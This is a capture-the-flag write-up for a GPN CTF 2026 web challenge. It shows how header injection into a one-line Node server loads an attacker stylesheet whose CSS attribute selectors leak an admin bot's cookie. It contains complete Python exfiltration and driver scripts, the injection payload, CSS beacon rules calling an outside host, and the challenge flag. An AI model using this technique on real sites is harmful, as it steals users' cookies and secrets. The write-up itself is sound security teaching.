# tinyweb

**Category:** Web
**Event:** GPN CTF 2026

> 481 bytes. How bad can it be?

**Flag:** `GPNCTF{codE_gOLF_i5_fUN__firEF0x_FEA7uRe5_7Oo}`

## TL;DR

A one-line Node `http` server reflects `unescape(req.url)` into a `Link`
header and `req.headers.cookie` into a `<body onload=fetch(...)>` body. An
admin bot stores the flag as a cookie and visits a user-supplied URL on
`http://localhost:8080`. The `Link` value is closed early with a `>`
injected via the URL, so a second link entry can advertise
`rel=stylesheet` pointing to an attacker-controlled CSS. The CSS uses
`body[onload^="..."]` attribute selectors to leak the cookie char-by-char
through `background: url(...)` requests. Iterate ~45 times → full flag.

## Source

`index.js` (the server the bot visits):

```js
require('http').createServer((a,b)=>
  b.writeHead(200,{
    'content-type':'text/html',
    link:`<${unescape(a.url)}>;rel=preload;as=fetch`
  })
  + b.end(`<body onload=fetch('${a.headers.cookie}')>`)
).listen(8080)
```

`admin.js` (the headless-Chromium bot, abridged):

```js
const cookieSetter = await browser.newPage()
await cookieSetter.goto("http://localhost:8080", {waitUntil:'domcontentloaded'})
await cookieSetter.evaluate(flag => document.cookie = flag, process.env.FLAG)
await cookieSetter.close()

const page = await browser.newPage()
await page.goto(targetUrl, {waitUntil:'domcontentloaded'})        // targetUrl must
await sleep(30000)                                                // start with
await browser.close()                                             // http://localhost:8080
```

`process.env.FLAG` is set to the string `flag=GPNCTF{...}` so the cookie
ends up as a normal `Cookie: flag=GPNCTF{...}` request header.

## Sinks

The server has two reflections:

| Sink                              | Source                  | Encoding           |
|-----------------------------------|-------------------------|--------------------|
| `Link: <SINK>;rel=preload;as=fetch`| `unescape(req.url)`     | header value       |
| `<body onload=fetch('SINK')>`     | `req.headers.cookie`    | JS string literal  |

We control the URL the bot visits (subject to `startsWith('http://localhost:8080')`),
so we control `req.url` → the `Link` header. We do **not** control the
cookie value — that is the flag itself.

## Why the obvious tricks don't work

- **CRLF injection** (`%0d%0a`) — Node's `http` module rejects header values
  that contain `\r`, `\n`, or anything `< 0x20` except `\t`. Sending such
  bytes makes `writeHead` throw and the connection 502s.
- **Cookie XSS via the body** — the body reflects `'${cookie}'` into a JS
  string. The flag (`GPNCTF{...}`) is just alphanumerics + `_{}=` and
  contains no `'`, `\`, or newline, so it cannot break out of the string
  on its own. We need a second cookie we control, but there is no way to
  set one (no `Set-Cookie` from the server, no XSS on the cookie-setter
  page either — the cookieSetter loads the body when `req.headers.cookie`
  is `undefined`).
- **Direct exfil of the cookie via `fetch`** — `fetch('${cookie}')` resolves
  the cookie as a *relative* URL, which always stays on `localhost:8080`.
  The flag doesn't start with `//` or `http://`, so no cross-origin request.

## The Link-header CSS injection

`Link` headers can carry multiple comma-separated entries:

```
Link: <a>;rel=preload, <b>;rel=stylesheet, <c>;rel=preload
```

The server's template is `<${unescape(a.url)}>;rel=preload;as=fetch`.
If our URL decodes to `?>,<https://EVIL/x.css>;rel=stylesheet,</x`, the
final value is:

```
Link: </?>,<https://EVIL/x.css>;rel=stylesheet,</x>;rel=preload;as=fetch
```

Three valid entries:

1. `</?>` — useless preload of `/?`.
2. `<https://EVIL/x.css>;rel=stylesheet` — **fetches our CSS and applies it
   as a stylesheet to the bot's page**.
3. `</x>;rel=preload;as=fetch` — the leftover boilerplate, a harmless
   preload.

Percent-encoded payload path:

```
?%3E%2C%3Chttps%3A%2F%2FEVIL%2Fx.css%3E%3Brel%3Dstylesheet%2C%3C%2Fx
```

## CSS attribute-selector exfiltration

The bot's body looks like:

```html
<body onload=fetch('flag=GPNCTF{codE_gOLF_…')>
```

CSS `[attr^="prefix"]` matches a starting substring of an attribute. With
one rule per candidate next character, only the matching rule fires —
and its `background-image` URL beacons our server:

```css
body[onload^="fetch('flag=GPNCTF{a"] { background: url("https://EVIL/leak?c=a") }
body[onload^="fetch('flag=GPNCTF{b"] { background: url("https://EVIL/leak?c=b") }
…
body[onload^="fetch('flag=GPNCTF{}"] { background: url("https://EVIL/leak?c=%7D") }
```

The bot's browser evaluates the selectors, makes one outbound request,
and the attacker server logs which character matched. Update the known
prefix and repeat until the leaked character is `}`.

## Exploit

### Attacker server (`exfil_server.py`)

```python
#!/usr/bin/env python3
import http.server, socketserver, urllib.parse, os, string

PREFIX_FILE = "/tmp/exfil_prefix.txt"
LOG_FILE    = "/tmp/exfil_log.txt"
CHARS = string.printable.replace("\n","").replace("\r","").replace("\t","")\
                       .replace("\x0b","").replace("\x0c","")

def get_prefix():
    return open(PREFIX_FILE).read() if os.path.exists(PREFIX_FILE) else "fetch('"

def make_css(prefix, base_url):
    rules = []
    for c in CHARS:
        full = (prefix + c).replace("\\","\\\\").replace('"','\\"')
        rules.append(
            f'body[onload^="{full}"] '
            f'{{ background: url("{base_url}/leak?c={urllib.parse.quote(c,safe="")}"); }}'
        )
    return "\n".join(rules)

class H(http.server.BaseHTTPRequestHandler):
    def log_message(self, *a): pass
    def do_GET(self):
        if self.path.startswith("/leak"):
            qs = urllib.parse.urlparse(self.path).query
            c = urllib.parse.parse_qs(qs).get("c", [""])[0]
            with open(LOG_FILE, "a") as f: f.write(f"LEAK: {c!r}\n")
            print(f"LEAKED: {c!r}", flush=True)
            self.send_response(204); self.end_headers()
        elif self.path == "/style.css":
            host = self.headers.get("Host", "localhost")
            css  = make_css(get_prefix(), f"https://{host}")
            self.send_response(200)
            self.send_header("Content-Type", "text/css")
            self.send_header("Access-Control-Allow-Origin", "*")
            self.end_headers(); self.wfile.write(css.encode())
        else:
            self.send_response(200); self.end_headers(); self.wfile.write(b"OK")

with socketserver.TCPServer(("", 9000), H) as srv:
    srv.serve_forever()
```

Expose `:9000` publicly. I used `ssh -R 80:localhost:9000 serveo.net`,
which gave me `https://<sub>.serveousercontent.com` — and crucially does
**not** show an interstitial warning page (so the bot's browser fetches
the CSS directly).

### Driver (`auto_exfil.py`)

```python
#!/usr/bin/env python3
import urllib.parse, urllib.request, time, os

INSTANCE = "https://<the-challenge-instance>.gpn24.ctf.kitctf.de"
CSS_URL  = "https://<sub>.serveousercontent.com/style.css"
PREFIX_FILE, LOG_FILE = "/tmp/exfil_prefix.txt", "/tmp/exfil_log.txt"

def set_prefix(p):  open(PREFIX_FILE, "w").write(p)
def clear_log():    open(LOG_FILE,    "w").close()
def last_leak():
    try:
        lines = [l for l in open(LOG_FILE).read().split("\n") if l.startswith("LEAK:")]
        return lines[-1].split(": ",1)[1].strip().strip("'") if lines else None
    except: return None

def submit_bot():
    inj = "?" + urllib.parse.quote(f">,<{CSS_URL}>;rel=stylesheet,</x", safe="")
    target = f"http://localhost:8080/{inj}"
    url = f"{INSTANCE}/bot/run?url={urllib.parse.quote(target, safe='')}"
    return urllib.request.urlopen(url, timeout=60).read().decode().strip()

flag = ""                                     # known prefix
for _ in range(80):
    set_prefix(f"fetch('flag=GPNCTF{{{flag}")
    clear_log()
    submit_bot()
    deadline = time.time() + 60
    leaked = None
    while time.time() < deadline:
        leaked = last_leak()
        if leaked is not None: break
        time.sleep(2)
    if leaked is None:
        print(f"no leak. flag so far: {flag!r}"); break
    flag += leaked
    print(f"leaked {leaked!r} → flag={flag!r}")
    if leaked == "}": break
```

Each iteration ≈ 35 s (30 s `await sleep(30000)` in the bot + LLL of
network round-trips). ~45 iterations recover the flag in ~25 minutes.

## Result

```
flag=GPNCTF{codE_gOLF_i5_fUN__firEF0x_FEA7uRe5_7Oo}
```

> "code golf is fun, firefox features too" — apt for a one-line server
> whose `Link: rel=preload` is a Firefox-shipped behavior the challenge
> hinges on.

## Lessons

- `unescape` is one of those tasty deprecated APIs that decode `%XX` and
  `%uXXXX` happily — always assume a clever attacker can shape its output.
- Anywhere a user-controlled string lands inside a structured header
  (Link, Content-Security-Policy, Set-Cookie, …), assume the attacker
  can split on the structural separators (`,`, `;`, `<`, `>`).
- A `Link: rel=stylesheet` to an attacker origin is one of the cheapest
  XSLeak primitives on the modern web: 0 JS execution required, leaks
  selector matches via background-image network beacons.
